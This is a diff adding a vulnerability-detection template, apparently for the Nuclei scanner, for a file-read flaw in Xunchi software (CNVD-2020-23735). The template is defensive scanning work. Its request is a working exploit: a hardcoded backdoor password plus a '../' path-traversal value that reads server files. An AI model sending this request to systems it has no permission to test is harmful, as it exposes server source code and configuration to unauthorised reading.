@@ -1,0 +1,22 @@
+id: xunchi-cnvd-2020-23735-file-read
+info:
+  name: Xunchi File Read (CNVD-2020-23735)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: cnvd-2020-23735,CNVD-2020-23735
+http:
+  - method: GET
+    path:
+      - "/backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php"
+    headers:
+      Accept-Encoding: deflate
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "NzbwpQSdbY06Dngnoteo2wdgiekm7j4N"
+          - "display_errors"
